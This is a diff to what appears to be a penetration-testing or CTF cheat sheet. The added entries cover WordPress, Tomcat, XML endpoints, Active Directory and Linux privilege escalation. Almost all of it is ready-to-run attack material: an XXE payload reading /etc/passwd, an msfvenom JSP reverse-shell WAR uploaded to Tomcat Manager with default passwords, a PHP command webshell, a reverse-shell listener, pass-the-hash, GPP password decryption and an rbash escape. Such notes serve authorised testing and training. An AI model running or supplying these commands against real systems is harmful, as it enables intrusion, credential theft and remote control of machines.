@@ -99,6 +99,15 @@ curl -s http://$IP/wp-json/wp/v2/users                           # user enum via
 wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login brute
 # admin panel -> Appearance > Theme Editor > 404.php = PHP shell ; wp-config.php holds the DB creds
 
+# XXE - any endpoint that parses XML (reads local files)
+# <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+#   PHP source: file:///... -> php://filter/convert.base64-encode/resource=index.php
+
+# Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
+curl -u tomcat:s3cret -T rev.war "http://$IP:8080/manager/text/deploy?path=/rev"
+curl "http://$IP:8080/rev/"       # listener up first
+
 # PHP shells to upload
 echo '<?php system($_GET["cmd"]); ?>' > cmd.php          # then browse cmd.php?cmd=id
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp <port>, browse it
@@ -163,6 +172,12 @@ evil-winrm -i $IP -u <user> -H <ntlm-hash>       # pass-the-hash
 ```
 
 ## Active Directory (88 present = DC)
+
+```bash
+# GPP cpassword pulled from a share by hand (e.g. null-session Replication share)
+gpp-decrypt '<cpassword>'                      # AES key is public; recovers the plaintext
+```
+
 
 ```bash
 kerbrute userenum -d <domain> --dc $IP users.txt
@@ -240,6 +255,9 @@ find / -perm -4000 -type f 2>/dev/null       # SUID
 getcap -r / 2>/dev/null                       # capabilities
 crontab -l; cat /etc/crontab
 # check GTFOBins for anything you find in sudo -l or SUID
+./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
+# restricted shell (rbash)? escape:
+ssh <user>@$IP -t bash --noprofile --norc      # or from inside: vi -> :set shell=/bin/sh :shell
 
 # Windows
 .\winpeas.exe
